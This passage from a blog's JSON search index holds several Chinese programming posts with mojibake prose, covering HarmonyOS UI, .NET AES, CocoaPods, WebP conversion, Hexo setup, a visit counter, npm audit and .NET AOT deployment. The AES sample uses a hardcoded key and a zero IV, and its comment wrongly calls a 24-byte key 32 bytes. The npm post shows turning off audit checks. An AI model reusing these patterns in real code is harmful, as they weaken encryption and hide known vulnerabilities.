&#125; &#125; GridItem()&#123; Column()&#123; Image($r(&#x27;app.media.icon&#x27;)) .borderRadius(2) &#125; &#125; GridItem()&#123; Column()&#123; Image($r(&#x27;app.media.icon&#x27;)) .borderRadius(2) &#125; &#125; GridItem()&#123; Column()&#123; Image($r(&#x27;app.media.44&#x27;)) .borderRadius(2) &#125; &#125; &#125; .columnsTemplate(&#x27;1fr 1fr&#x27;) .columnsGap(&#x27;12vp&#x27;) .rowsGap(&#x27;12vp&#x27;) //.padding(&#x27;2vp&#x27;) &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) &#125;&#125; æ ¸å¿ƒGridçš„ 1.columnsTemplate(&#x27;1fr 1fr &#x27;) è½®æ’­æ•°æ® åˆå¹¶datadata 12345678910export default class com&#123; static SWIPERLIST:Array&lt;Resource&gt;=[ $r(&#x27;app.media.11&#x27;), $r(&#x27;app.media.22&#x27;), $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;) ]&#125; åˆ—è¡¨æ•°æ® 123456789101112131415161718192021222324252627282930313233343536373839404142434445 static IMGLIST :Resource[][]=[ [ $r(&#x27;app.media.11&#x27;), $r(&#x27;app.media.22&#x27;), $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;)], [ $r(&#x27;app.media.22&#x27;), $r(&#x27;app.media.11&#x27;), $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;)] , [ $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;), $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;)] , [ $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.11&#x27;), $r(&#x27;app.media.33&#x27;), $r(&#x27;app.media.44&#x27;), $r(&#x27;app.media.11&#x27;)] ]// ForEach(coms.IMGLIST,(item:Array&lt; Resource&gt;,index?:Number)=&gt;&#123; GridItem()&#123; Column()&#123; Image(item[0]) .borderRadius(2) .aspectRatio(1.6) .borderRadius(&#x27;5vp&#x27;) .margin(&#x27;5vp&#x27;) // .padding(&#x27;5vp&#x27;) &#125; &#125; ğŸˆpagelist p2routerP2 123456.onClick(()=&gt;&#123; router.pushUrl(&#123; url:&#x27;pages/ListPage&#x27;, params:&#123;ptitem:item&#125; &#125;) &#125;) main_pages.jsé…ç½®è·¯ç”± 123456789101112131415161718192021222324252627282930313233343536 //ts Record item:Array&lt;Resource&gt; = (router.getParams() as Record&lt;string, Array&lt;Resource&gt;&gt;).item;//... Navigation()&#123; Grid() &#123; ForEach(this.item,(item2: Resource,index?:Number)=&gt; &#123; GridItem() &#123; Image(item2) .borderRadius(2) .aspectRatio(1.6) .borderRadius(&#x27;5vp&#x27;) .margin(&#x27;5vp&#x27;) // .padding(&#x27;5vp&#x27;) &#125; &#125;) &#125; .columnsTemplate(&#x27;1fr 1fr 1fr&#x27;) .columnsGap(5) .rowsGap(5) .margin(&#x27;12vp&#x27;) &#125; .title(&#x27;p2&#x27;) .hideNavBar(false) .titleMode(NavigationTitleMode.Mini) hmosé‡Œé¢çš„console.log 12//log hilog.info(0x0000,&#x27;image&#x27;,&#x27;abc&#x27;); ğŸª„page p31234567891011121314151617181920item3:Resource = (router.getParams() as Record&lt;string, Resource&gt;).item3;// []build() &#123; Navigation()&#123; Image(this.item3) .borderRadius(2) .aspectRatio(1.6) .borderRadius(&#x27;5vp&#x27;) .margin(&#x27;5vp&#x27;) &#125; .title(&#x27;p3&#x27;) .hideNavBar(false) .titleMode(NavigationTitleMode.Mini) å¤‡æ³¨ Imageç»„ä»¶å…±æœ‰ä»¥ä¸‹ä¸‰ç§å£°æ˜æ–¹å¼ï¼šï¼ˆ1ï¼‰stringæ ¼å¼ï¼Œé€šå¸¸ç”¨æ¥åŠ è½½ç½‘ç»œå›¾ç‰‡ï¼Œè‹¥éƒ¨ç½²åœ¨çœŸå®è®¾å¤‡ä¸Šï¼Œéœ€è¦ç”³è¯·ç½‘ç»œè®¿é—®æƒé™ Imageï¼ˆâ€URLâ€ï¼‰ï¼ˆ2ï¼‰PixelMapæ ¼å¼ï¼Œå¯ä»¥åŠ è½½åƒç´ å›¾ï¼Œå¸¸ç”¨åœ¨å›¾ç‰‡ç¼–è¾‘ä¸­ Imageï¼ˆpixelMapObjectï¼‰ï¼ˆ3ï¼‰Resourceæ ¼å¼ï¼ŒåŠ è½½æœ¬åœ°å›¾ç‰‡ï¼ˆæ¨èï¼‰ Image($r(â€˜app.media.xxxâ€™))ä¸éœ€è¦å¸¦åç¼€å åœ°å€ï¼šsrc&#x2F;main&#x2F;resources&#x2F;base&#x2F;media Image($rawfile(xxx.png))éœ€è¦åç¼€ï¼Œåœ°å€ï¼šsrc&#x2F;main&#x2F;resources&#x2F;rawfile end","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"}],"author":"mu"},{"title":".NET AES DES","slug":"NET-ASE-DES","date":"2024-05-15T07:01:42.000Z","updated":"2024-06-01T03:00:02.000Z","comments":true,"path":"2024/05/15/NET-ASE-DES/","permalink":"https://banjinmei.github.io/2024/05/15/NET-ASE-DES/","excerpt":"","text":".NET AES DES å¯¹ç§°åŠ å¯† ASE åŠ å¯†è§£å¯†åŠ å¯†æ–¹æ³• (Encrypt): åˆ›å»ºä¸€ä¸ª Aes å®ä¾‹ã€‚è®¾ç½®å¯†é’¥ (Key) å’Œåˆå§‹åŒ–å‘é‡ (IV)ã€‚ä½¿ç”¨ CreateEncryptor åˆ›å»ºåŠ å¯†å™¨ã€‚é€šè¿‡ CryptoStream å’Œ StreamWriter å°†æ˜æ–‡å†™å…¥å†…å­˜æµï¼Œç„¶åè½¬æ¢ä¸º Base64 å­—ç¬¦ä¸²ã€‚ è§£å¯†æ–¹æ³• (Decrypt): åŒæ ·åˆ›å»ºä¸€ä¸ª Aes å®ä¾‹ã€‚è®¾ç½®ç›¸åŒçš„å¯†é’¥å’Œåˆå§‹åŒ–å‘é‡ã€‚ä½¿ç”¨ CreateDecryptor åˆ›å»ºè§£å¯†å™¨ã€‚é€šè¿‡ CryptoStream å’Œ StreamReader ä»å†…å­˜æµè¯»å–å¯†æ–‡å¹¶è§£å¯†ä¸ºæ˜æ–‡ã€‚ æ³¨æ„äº‹é¡¹å¯†é’¥é•¿åº¦ï¼šAES æ”¯æŒ 128, 192, å’Œ 256 ä½å¯†é’¥ã€‚æœ¬ä¾‹ä½¿ç”¨ 256 ä½ï¼ˆ32 å­—èŠ‚ï¼‰ã€‚åˆå§‹åŒ–å‘é‡ (IV)ï¼šåº”ç¡®ä¿åŠ å¯†å’Œè§£å¯†æ—¶ä½¿ç”¨ç›¸åŒçš„ IVã€‚æœ¬ä¾‹ä¸­ä½¿ç”¨äº†å…¨é›¶çš„ IVï¼Œåœ¨å®é™…åº”ç”¨ä¸­å»ºè®®ä½¿ç”¨éšæœº IVï¼Œå¹¶å°†å…¶ä¸å¯†æ–‡ä¸€èµ·å­˜å‚¨ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566using System;using System.IO;using System.Security.Cryptography;using System.Text;class SymmetricEncryption&#123; // åŠ å¯†æ–¹æ³• public static string Encrypt(string plainText, string key) &#123; using (Aes aesAlg = Aes.Create()) &#123; aesAlg.Key = Encoding.UTF8.GetBytes(key); aesAlg.IV = new byte[16]; // åˆå§‹åŒ–å‘é‡ (IV) å¯ä»¥è®¾ä¸ºå…¨é›¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨éšæœºå€¼ ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV); using (MemoryStream msEncrypt = new MemoryStream()) &#123; using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)) using (StreamWriter swEncrypt = new StreamWriter(csEncrypt)) &#123; swEncrypt.Write(plainText); &#125; return Convert.ToBase64String(msEncrypt.ToArray()); &#125; &#125; &#125; // è§£å¯†æ–¹æ³• public static string Decrypt(string cipherText, string key) &#123; using (Aes aesAlg = Aes.Create()) &#123; aesAlg.Key = Encoding.UTF8.GetBytes(key); aesAlg.IV = new byte[16]; // ä¸åŠ å¯†æ—¶ä½¿ç”¨ç›¸åŒçš„ IV ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV); using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText))) &#123; using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) using (StreamReader srDecrypt = new StreamReader(csDecrypt)) &#123; return srDecrypt.ReadToEnd(); &#125; &#125; &#125; &#125; // ç¤ºä¾‹ä¸»æ–¹æ³• public static void Main() &#123; string original = &quot;Hello, World!&quot;; string key = &quot;thisisaverysecretkey1234&quot;; // 32 å­—èŠ‚çš„å¯†é’¥ // åŠ å¯† string encrypted = Encrypt(original, key); Console.WriteLine($&quot;Encrypted: &#123;encrypted&#125;&quot;); // è§£å¯† string decrypted = Decrypt(encrypted, key); Console.WriteLine($&quot;Decrypted: &#123;decrypted&#125;&quot;); &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"AES","slug":"AES","permalink":"https://banjinmei.github.io/tags/AES/"},{"name":"DES","slug":"DES","permalink":"https://banjinmei.github.io/tags/DES/"}],"author":"mu"},{"title":"IOS POD","slug":"IOS-POD","date":"2024-05-14T02:51:59.000Z","updated":"2024-06-01T02:58:54.000Z","comments":true,"path":"2024/05/14/IOS-POD/","permalink":"https://banjinmei.github.io/2024/05/14/IOS-POD/","excerpt":"","text":"IOS POD 1brew install cocoapod 1gem install cocoapod 1sudo gem install cocoapod 1sudo brew update 1ruby update 1rvm install 2.7 cd xx 12pod install","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"IOD","slug":"IOD","permalink":"https://banjinmei.github.io/tags/IOD/"},{"name":"POD","slug":"POD","permalink":"https://banjinmei.github.io/tags/POD/"}],"author":"mu"},{"title":".NET webp","slug":"NET-Webp","date":"2024-05-10T01:28:17.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/10/NET-Webp/","permalink":"https://banjinmei.github.io/2024/05/10/NET-Webp/","excerpt":"","text":"åœ¨C#ä¸­ï¼Œå¯ä»¥ä½¿ç”¨Imageç±»å’ŒBitmapç±»æ¥å¤„ç†å›¾åƒï¼Œå¹¶ä¸”å¯ä»¥å€ŸåŠ©Magick.NETåº“æ¥å°†JPGå›¾ç‰‡è½¬æ¢ä¸ºWEBPæ ¼å¼ã€‚ å®‰è£…Magick.NET-Q8-AnyCPU NuGetåŒ…ã€‚ 1using ImageMagick; è½¬æ¢æ–¹æ³• 12345678910public void ConvertJpgToWebP2(string inputFilePath, string outputFilePath)&#123; using (var image = new MagickImage(inputFilePath)) &#123; // è®¾ç½®WEBPå‹ç¼©è´¨é‡ï¼ŒèŒƒå›´ä»0ï¼ˆæœ€å¥½çš„è´¨é‡ï¼‰åˆ°100ï¼ˆæœ€å¿«é€Ÿå‹ç¼©ï¼‰ image.Quality = 80; image.Format = MagickFormat.WebP; image.Write(outputFilePath); &#125;&#125; è°ƒç”¨ 1234string jpgPath = &quot;E:\\\\net8test\\\\ConsoleApp1Test\\\\ConsoleApp1Test\\\\bin\\\\Debug\\\\net8.0\\\\55.jpg&quot;;string webpPath = &quot;E:\\\\net8test\\\\ConsoleApp1Test\\\\ConsoleApp1Test\\\\bin\\\\Debug\\\\net8.0\\\\55.webp&quot;;Ig ig = new Ig();ig.ConvertJpgToWebP2(jpgPath, webpPath);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"webp","slug":"webp","permalink":"https://banjinmei.github.io/tags/webp/"}],"author":"mu"},{"title":"Hexo Categories Tags","slug":"Hexo-Categories-Tag","date":"2024-05-09T05:25:52.000Z","updated":"2024-06-01T02:58:12.000Z","comments":true,"path":"2024/05/09/Hexo-Categories-Tag/","permalink":"https://banjinmei.github.io/2024/05/09/Hexo-Categories-Tag/","excerpt":"","text":"é…ç½®categoriesæ–°å»ºé¡µé¢categories:1hexo new page &quot;categories&quot; æ‰§è¡Œå‘½ä»¤åå°†æ–°ç”Ÿæˆæ–‡ä»¶å¤¹categoriesï¼Œå¹¶åœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆindex.mdæ–‡ä»¶ã€‚ ç¼–è¾‘categories&#x2F;index.mdæ–‡ä»¶:vi {path}&#x2F;source&#x2F;categories&#x2F;index.mdç¼–è¾‘å†…å®¹ï¼š 12345---title: åˆ†ç±»date: 2017-10-25 22:00:00type: &quot;categories&quot;--- ç¼–è¾‘ä¸»é¢˜é…ç½®æ–‡ä»¶themes&#x2F;xx&#x2F;_config.yml:vi {path}&#x2F;themes&#x2F;xx&#x2F;_config.ymlå°†menuä¸­çš„categoriesçš„æ³¨é‡Šå»æ‰ï¼š 123456789menu: home: / || home #tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #about: /about/ || user #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat ç¼–è¾‘æ–‡ç« åœ¨Front-matteråŒºåŸŸï¼ˆå³â€”åˆ†éš”çš„åŒºåŸŸï¼‰æŒ‡å®šcategorieså³å¯ï¼š12345678---title: testdate: 2017-01-01 00:00:00categories: - ç±»åˆ«åç§°tags: - æ ‡ç­¾--- 123456789101112131415categories/index.md---title: åˆ†ç±»date: 2024-05-08 22:00:00type: &quot;categories&quot;---- [åˆ†ç±»](/categories/)- [åˆ†ç±»-æŠ€æœ¯](/categories/æŠ€æœ¯/)- [åˆ†ç±»-ç”Ÿæ´»](/categories/ç”Ÿæ´»/) åˆ†ç±»å…·æœ‰é¡ºåºæ€§å’Œå±‚æ¬¡æ€§ï¼Œè€Œæ ‡ç­¾æ²¡æœ‰é¡ºåºå’Œå±‚æ¬¡ã€‚ é…ç½®tagsæ–°å»ºé¡µé¢tags:1hexo new page &quot;tags&quot; ç¼–è¾‘tags&#x2F;index.mdæ–‡ä»¶:1234567891011121314&lt;% if (site.tags.length)&#123; %&gt; &lt;aside&gt; &lt;div class=&quot;widget&quot;&gt; &lt;h3 class=&quot;widget-title&quot;&gt;æ ‡ç­¾äº‘&lt;/h3&gt; &lt;div class=&quot;widget-content&quot;&gt; &lt;% site.tags.forEach(function(tag)&#123; %&gt; &lt;a href=&quot;&lt;%= url_for(tag.path) %&gt;&quot; style=&quot;font-size: &lt;%= tag.length %&gt;px;&quot;&gt;&lt;%= tag.name %&gt;&lt;/a&gt; &lt;% &#125;) %&gt; &lt;/div&gt; &lt;/div&gt; &lt;/aside&gt;&lt;% &#125; %&gt; vi {path}&#x2F;source&#x2F;tags&#x2F;index.mdç¼–è¾‘å†…å®¹ï¼š 12345---title: æ ‡ç­¾date: 2017-10-25 22:05:00type: &quot;tags&quot;--- ç¼–è¾‘ä¸»é¢˜é…ç½®æ–‡ä»¶themes&#x2F;xx&#x2F;_config.yml:vi {path}&#x2F;themes&#x2F;next&#x2F;_config.ymlå°†menuä¸­çš„tagsçš„æ³¨é‡Šå»æ‰ï¼š 123456789menu: home: / || home tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #about: /about/ || user #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat æ–‡ç« æŒ‡å®štagsçš„å†™æ³•ä¸categoriesä¸€è‡´ï¼Œåœ¨Front-matteråŒºåŸŸæŒ‡å®šå³å¯ï¼Œå†™æ³•å¯å‚è€ƒä»¥ä¸Šã€‚ é…ç½®aboutæ–°å»ºé¡µé¢about:1hexo new page &quot;about&quot; ç¼–è¾‘about&#x2F;index.mdæ–‡ä»¶ï¼Œå†…å®¹å¯æ ¹æ®ä¸ªäººç¼–å†™ï¼›vi {path}&#x2F;source&#x2F;about&#x2F;index.md ç¼–è¾‘ä¸»é¢˜é…ç½®æ–‡ä»¶themes&#x2F;xx&#x2F;_config.yml:vi {path}&#x2F;themes&#x2F;xx&#x2F;_config.ymlå°†menuä¸­çš„aboutçš„æ³¨é‡Šå»æ‰ï¼š 1234567891011menu: home: / || home tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive about: /about/ || user #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"Web uvpv busuanzi","slug":"Web-busuanzi","date":"2024-05-08T13:19:32.000Z","updated":"2024-06-01T03:09:14.000Z","comments":true,"path":"2024/05/08/Web-busuanzi/","permalink":"https://banjinmei.github.io/2024/05/08/Web-busuanzi/","excerpt":"","text":"WEB UVPV busuanzi ä¸è’œå­ä¸è’œå­æ˜¯ä¸€æ¬¾ç”¨äºé™æ€ç½‘ç«™çš„è®¿é—®è®¡æ•°å·¥å…·ï¼Œå¯ä»¥æ–¹ä¾¿åœ°åœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºè®¿é—®æ¬¡æ•°ã€‚ä¸å…¶ä»–ç»Ÿè®¡å·¥å…·å¦‚ç™¾åº¦ç»Ÿè®¡å’Œè°·æ­Œåˆ†æä¸åŒçš„æ˜¯ï¼Œä¸è’œå­ç›´æ¥å°†è®¿é—®æ¬¡æ•°æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šï¼Œè€Œä¸éœ€è¦ç”¨æˆ·è·³è½¬åˆ°å¤–éƒ¨å¹³å°æŸ¥çœ‹ã€‚ ä¸è’œå­çš„è®¡æ•°åŸç†ï¼šé€šè¿‡åœ¨ç½‘é¡µä¸­å¼•å…¥JavaScriptè„šæœ¬ï¼Œå°†å½“å‰é¡µé¢çš„URLæˆ–æŸç§å”¯ä¸€æ ‡è¯†æ³¨å†Œåˆ°ä¸è’œå­çš„æœåŠ¡å™¨ä¸Šï¼ŒæœåŠ¡å™¨ä¿å­˜ç€URLä¸å¯¹åº”çš„è®¿é—®è®¡æ•°å€¼ã€‚å½“é¡µé¢è¢«è®¿é—®æ—¶ï¼Œé€šè¿‡JavaScriptæ›´æ–°æœåŠ¡å™¨ä¸Šçš„è®¡æ•°å€¼ï¼Œå¹¶åœ¨é¡µé¢åˆå§‹åŒ–æ—¶åŠ è½½å¹¶æ˜¾ç¤ºè®¡æ•°å€¼ã€‚ å¦‚ä½•ä½¿ç”¨ï¼Ÿåœ¨ç½‘é¡µéœ€è¦å¼•ç”¨è®¡æ•°åŠŸèƒ½çš„åœ°æ–¹å…ˆå¼•å…¥ä¸è’œå­çš„js 12&lt;!-- å¼•å…¥ä¸è’œå­è®¡æ•° --&gt;&lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; ä¸ºäº†ç¾è§‚ï¼Œæˆ‘ä»¬å†å¼•å…¥æ—‹è½¬èŠ±ç“£åŠ è½½ç‰¹æ•ˆâ€fa fa-spinner fa-spinâ€æ€»è®¿é—®é‡è®¡æ•°ç®—æ³•ï¼špvæ–¹å¼ï¼Œå•ä¸ªç”¨æˆ·è¿ç»­ç‚¹å‡»nç¯‡æ–‡ç« ï¼Œè®°å½•næ¬¡è®¿é—®é‡ã€‚æ€»è®¿å®¢æ•°è®¡æ•°ç®—æ³•ï¼šuvæ–¹å¼ï¼Œå•ä¸ªç”¨æˆ·è¿ç»­ç‚¹å‡»nç¯‡æ–‡ç« ï¼Œåªè®°å½•1æ¬¡è®¿å®¢æ•°ã€‚ 123&lt;center&gt; æµè§ˆé‡ï¼š&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;i class=&quot;fa fa-spinner fa-spin&quot;&gt;&lt;/i&gt;&lt;/span&gt;ğŸ‘€ | è®¿å®¢æ•°ï¼š&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;i class=&quot;fa fa-spinner fa-spin&quot;&gt;&lt;/i&gt;&lt;/span&gt;ğŸ‘¦&lt;/center&gt; æ³¨ï¼šç¾åŒ–åŠå…¶ä»–åµŒå…¥çš„æ”¹åŠ¨ï¼Œå…¶å®åªè¦å†…å±‚çš„spanå°±å¯ä»¥ï¼Œç„¶åç”¨cssç¾åŒ–æˆ–è€…åšåµŒå…¥","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"npm audit","slug":"Nodejs-npm-audit","date":"2024-05-08T11:11:07.000Z","updated":"2024-06-01T03:07:28.000Z","comments":true,"path":"2024/05/08/Nodejs-npm-audit/","permalink":"https://banjinmei.github.io/2024/05/08/Nodejs-npm-audit/","excerpt":"","text":"11 packages are looking for funding run npm fund for details 6 vulnerabilities (4 high, 2 critical) To address issues that do not require attention, run: npm audit fix To address all issues, run: npm audit fix â€“force Run npm audit for details. â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” è¿™ä¸ªæŠ¥é”™ä¿¡æ¯çš„æ„æ€æ˜¯ï¼š ä¾èµ–åŒ…å·²ç»æ˜¯æœ€æ–°çš„ï¼Œnpmæ£€æŸ¥äº†xxä¸ªåŒ…ï¼ŒèŠ±äº†xç§’é’Ÿã€‚æœ‰xä¸ªåŒ…æ­£åœ¨å¯»æ±‚èµ„é‡‘æ”¯æŒï¼Œè¿è¡Œnpm fundæ¥æŸ¥çœ‹è¯¦æƒ…ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©æèµ ä¸€äº›é’±ç»™è¿™äº›åŒ…çš„å¼€å‘è€…ã€‚æœ‰xä¸ªä¸­ç­‰ç¨‹åº¦çš„å®‰å…¨æ¼æ´ï¼Œè¿è¡Œnpm audit fix â€“forceæ¥ä¿®å¤æ‰€æœ‰çš„é—®é¢˜ï¼ŒåŒ…æ‹¬ä¸€äº›å¯èƒ½å¯¼è‡´ç ´åæ€§å˜åŒ–çš„é—®é¢˜ã€‚è¿è¡Œnpm auditæ¥æŸ¥çœ‹æ›´å¤šçš„ç»†èŠ‚ï¼ŒåŒ…æ‹¬æ¯ä¸ªæ¼æ´çš„ç±»å‹ï¼Œæ¥æºï¼Œå½±å“ç­‰ã€‚ è§£å†³æ–¹æ³• æœ‰æ—¶å€™å¹¶ä¸æƒ³ä¿®å¤è¿™äº›å®‰å…¨æ¼æ´ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä¼šå½±å“æˆ‘ä»¬çš„é¡¹ç›®çš„æ­£å¸¸è¿è¡Œï¼Œæˆ–è€…æˆ‘ä»¬åªæ˜¯æƒ³å¿«é€Ÿåœ°åˆå§‹åŒ–ä¸€ä¸ªé¡¹ç›®ï¼Œä¸æƒ³è¢«è¿™äº›æŠ¥é”™ä¿¡æ¯æ‰“æ‰°,å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç®€å•çš„å‘½ä»¤æ¥å…³é—­npmçš„auditæ£€æŸ¥ï¼šnpm set audit falseè¿™æ ·å°±å¯ä»¥ä¿è¯npmçš„auditä¸ä¼šå½±å“åˆå§‹åŒ–é¡¹ç›®ï¼Œä½†æ˜¯è¿™ä¸ªè§£å†³åŠæ³•å¹¶ä¸å»ºè®®ä½¿ç”¨åœ¨å®é™…ç”Ÿäº§ä¸­ï¼Œå› ä¸ºå®ƒä¼šè®©æˆ‘ä»¬å¿½ç•¥ä¸€äº›å¯èƒ½å­˜åœ¨çš„å®‰å…¨é£é™©ã€‚åŒæ ·çš„ï¼Œå¯ä»¥å°†å€¼è®¾ä¸ºtrueæ¥æ‰“å¼€npm auditæ£€æŸ¥ï¼Œè¿™æ ·å¯ä»¥çœ‹åˆ°npmçš„æŠ¥é”™ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¿®å¤å®ƒä»¬ï¼šnpm set audit trueè¿™ä¸ªæ“ä½œå°†å¯¹å…¨å±€ç”Ÿæ•ˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä¼šå½±å“æˆ‘ä»¬æ‰€æœ‰çš„é¡¹ç›®ï¼Œä¸ç®¡æ˜¯æ–°çš„è¿˜æ˜¯æ—§çš„ã€‚ ä¿®å¤~ä½†ä¸æ˜¯ç ´åæ€§ä¿®å¤ 1npm audit fix","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"npm","slug":"npm","permalink":"https://banjinmei.github.io/tags/npm/"}],"author":"mu"},{"title":".NET native AOT","slug":"NET-AOT-native","date":"2024-05-08T05:01:11.000Z","updated":"2024-12-13T16:49:45.226Z","comments":true,"path":"2024/05/08/NET-AOT-native/","permalink":"https://banjinmei.github.io/2024/05/08/NET-AOT-native/","excerpt":"","text":"å‰è¨€.NET8å¯¹äºæ€§èƒ½çš„ä¼˜åŒ–æ˜¯æ–¹æ–¹é¢é¢çš„ï¼Œæ‰€ä»¥AOTé¢„ç¼–è¯‘æœºå™¨ç ä¹Ÿæ˜¯ä¸ä¾‹å¤–çš„ã€‚æœ¬ç¯‡æ¥çœ‹ä¸‹å¯¹äºAOTçš„ä¼˜åŒ–ã€‚ æ¦‚è¿°é¦–å…ˆè¦æ˜ç¡®ä¸€ä¸ªæ¦‚å¿µï¼Œ.NETé‡Œé¢çš„AOTå®ƒæ˜¯åŸç”Ÿçš„ã€‚ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´é€šè¿‡ILCç¼–è¯‘å™¨(AOTç¼–è¯‘å™¨ï¼Œç¼–è¯‘å‡ºæ¥çš„ä»£ç æ˜¯å„ä¸ªå¹³å°ä¸Šå¯ä»¥ç›´æ¥è¿è¡Œçš„äºŒè¿›åˆ¶ä»£ç ã€‚æ¯”å¦‚MacOSçš„äºŒè¿›åˆ¶ï¼ŒLinuxäºŒè¿›åˆ¶ç­‰ç­‰ã€‚æ‰€ä»¥ç§°ä¹‹ä¸ºåŸç”Ÿã€‚ C#æºç è¢«ILCç¼–è¯‘ä¹‹åï¼Œç”Ÿæˆäº†ä¸€ä¸ªå®Œå…¨åŸç”Ÿæ€ä»£ç çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚åœ¨æ‰§è¡Œçš„æ—¶å€™ä¸éœ€è¦JITæ¥ç¼–è¯‘ä»»ä½•ä¸œè¥¿ï¼Œå› ä¸ºJITå·²ç»åœ¨ILCé‡Œé¢è¢«å……åˆ†åˆ©ç”¨è¿‡äº†ã€‚å®é™…ä¸ŠAOTé‡Œé¢ä¹Ÿæ²¡æœ‰åŒ…å«JITã€‚é‚£ä¹ˆå®ƒå¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿåªèƒ½æ˜¯åœ¨ILCé‡Œé¢è°ƒç”¨JITçš„æ—¶å€™äº†ã€‚æ‰€ä»¥å®ƒè¿™ä¸ªä¼˜åŒ–ä¾ç„¶ä¾é JITã€‚.NET8é‡Œé¢ä¼˜åŒ–AOTçš„ä¸€ä¸ªå…¸å‹çš„ä¾‹å­ï¼Œå°±æ˜¯ASP.NETåº”ç”¨ç¨‹åºåœ¨ä½¿ç”¨AOTçš„æ—¶å€™è¡¨ç°ä¸é”™ï¼ŒåŒæ—¶ä¹Ÿé™ä½äº†æ€»æˆæœ¬ã€‚ åˆ›å»ºé¡¹ç›®å¯ç”¨AOT æ‰“åŒ…æŒ‡ä»¤1dotnet publish DemoAot.csproj -o pub\\ -c Release -r win-x64 linuxä¸‹å…ˆå®‰è£…SDKå®‰è£…å 1dotnet --list-sdks 1dotnet publish DemoAot.csproj -o $PWD/pub -c Release -r linux-x64 macosä¸‹å®‰è£…SDKå 1dotnet --list-sdks 123456789101112131415161718192021222324252627282930313233dotnet publish DemoAot.csproj -o $PWD/pub -c Release -r osx-x64``` # é‡å¯æœåŠ¡å™¨ é€šè¿‡å‘½ä»¤ cd fser åŠsudo nohup /root/fser/fileserver &gt; output&#123;å½“å‰æ—¶é—´&#125;.log 2&gt;&amp;1 &amp; å’Œå‘½ä»¤ cd nets4 åŠsudo nohup dotnet /root/nets4/IM.dll &gt; output&#123;å½“å‰æ—¶é—´&#125;.log 2&gt;&amp;1 &amp; è‡ªåŠ¨åŒ–è¿è¡Œ ä¸ºäº†è‡ªåŠ¨åŒ–è¿è¡Œè¿™äº›ç¨‹åºå¯åŠ¨å‘½ä»¤ï¼Œå¯ä»¥ç¼–å†™ä¸€ä¸ª Shell è„šæœ¬å¹¶ç»“åˆç³»ç»Ÿå¯åŠ¨æœåŠ¡ï¼ˆå¦‚ systemdï¼‰æ¥æ‰§è¡Œã€‚ä»¥ä¸‹æ˜¯å…·ä½“å®ç°æ­¥éª¤ï¼š## 1. åˆ›å»º Shell è„šæœ¬ç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œæ¯”å¦‚å‘½åä¸º start_services.shï¼š```bash#!/bin/bash# 